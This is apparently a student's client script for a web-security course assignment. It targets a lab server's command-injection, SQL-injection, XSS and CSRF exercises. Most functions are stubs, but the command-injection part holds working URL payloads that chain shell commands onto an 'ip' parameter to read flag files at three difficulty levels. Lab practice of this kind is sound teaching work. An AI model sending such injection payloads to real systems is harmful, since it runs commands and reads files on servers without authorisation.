from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from bs4 import BeautifulSoup
import base64
import grader
import argparse

# NOTE: If you choose to run the servers on different ports for testing, please remember to set it back before submission.
TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
#TARGET_SERVER_ENDPOINT = 'http://35.223.68.134:80'

# NOTE: where you need to update your static IP address of your server
ATTACKER_SERVER_ENDPOINT = 'http://localhost:1338'
# ATTACKER_SERVER_ENDPOINT = 'http://your static IP address:80'

def xss(vuln_type, level):
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options) # Starts the browser

    driver.get(TARGET_SERVER_ENDPOINT) # Makes a request to the specified URL.

    # DO SOMETHING

    # Grader verification should be done in attacker_server/server.py

    driver.quit() # Closes the browser


def sql():
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    url = 'http://35.225.46.109/sql_injection/low/id/3'

    driver.get(url)

    soup = BeautifulSoup(driver.page_source) # Get the page contents and use for parsing.
    tr_elements = soup.find_all('tr') # Refer to the BeautifulSoup documentation for more details.
    print('123')
    print(tr_elements)

    # TODO: Populate the user_pass_list
    # user_pass_list = [] # Where this should be a list of lists for containing the users and passwords
                        # eg. [['username', 'password']]

    # pwd = ''
    # while True:
    #     for i in range(32, 127):



    # grader.sql_verify('low', user_pass_list)

    driver.quit()

def command_injection(level):

    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # NOTE: Remember to decode the flag before sending it to the grader.
    # grader.command_injection_verify(level, flag)
    if level == 'low':
        url = 'http://35.225.46.109/command_injection/low?ip=0.0.0.0;cd%20server/flags/command_injection;cat%20low.txt'
    elif level == 'medium':
        url = 'http://35.225.46.109/command_injection/medium?ip=0.0.0.0%26%3B%26cd%20server/flags/command_injection' \
              '%26%3B%26cat%20medium.txt '
    else:
        url = 'http://35.225.46.109/command_injection/high?ip=0.0.0.0%26%26cd%20server/flags/command_injection%26' \
              '%26cat%20high.txt '

    driver.get(url)
    element = driver.find_element_by_id('output')
    text = element.text
    secret = text.split('\n')[-1]
    flag = base64.b64decode(secret)
    grader.command_injection_verify(level, flag)

    driver.quit()

def csrf(level):

    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # grader.csrf_verify(level, secret_msg, comments) # where secret_msg is the expected comment in the database from your attack.

    driver.quit()


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Clients for different tasks in HW2.')
    parser.add_argument('q', metavar='N', type=str,
                        help='has to be one of [command_injection, sql_injection, xss, csrf]')
    parser.add_argument('--level', type=str, default="all",
                        help='the level for each question')

    args = parser.parse_args()

    # NOTE: Feel free to modify the code here for your own purposes.
    # The code below can be used as an example.
    
    if args.q == "command_injection":
        assert args.level in ['all', 'low', 'medium', 'high']
        if args.level == "all":
            levels = ['low', 'medium', 'high']
        else:
            levels = [args.level]
        for level in levels:
            command_injection(level)
        exit()

    if args.q == "sql":
        assert args.level in ['all', 'low']
        if args.level == "all":
            levels = ['low']
        else:
            levels = [args.level]
        for level in levels:
            sql()
        exit()

    if args.q == "xss":
        methods = {"1":"reflected", "2":"stored", "3":"DOM"}
        for vuln_type in ['1', '2', '3']:
            print("XSS with method", methods[vuln_type])
            if args.level == "all":
                levels = ['low', 'medium', 'high']
            else:
                levels = [args.level]
            for level in levels:
                xss(vuln_type, level)
        exit()

    if args.q == "csrf":
        if args.level == "all":
            levels = ['low', 'medium']
        else:
            levels = [args.level]
        for level in levels:
            csrf(level)
        exit()

